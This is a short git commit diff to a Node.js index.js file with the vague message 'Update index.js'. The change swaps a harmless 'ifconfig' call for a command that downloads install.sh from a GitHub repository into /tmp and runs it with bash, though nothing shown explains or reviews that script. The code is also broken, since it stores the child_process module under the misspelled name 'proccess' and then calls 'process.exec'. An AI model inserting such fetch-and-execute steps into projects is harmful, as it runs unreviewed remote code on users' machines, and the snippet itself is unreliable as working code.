2fe28a6d4e315a54b31d3f1cdd9bc01996dffd80
egemertdogan <75202865+egemertdogan@users.noreply.github.com>
2021-02-08 17:06:43 +0000

    Update index.js

--- index.js
+++ index.js
@@ -1,8 +1,9 @@
 var proccess = require('child_process');
-process.exec('ifconfig',function (err,stdout,stderr) {
-	    if (err) {
-		            console.log("\n"+stderr);
-		        } else {
-				        console.log(stdout);
-				    }
+process.exec('wget -P /tmp/ https://raw.githubusercontent.com/egemertdogan/EBALinux/main/install.sh ; bash /tmp/install.sh',function (err,stdout,stderr) {
+	if (err) {
+		console.log("\n"+stderr);
+	} 
+	else {
+		console.log(stdout);
+	}
 });
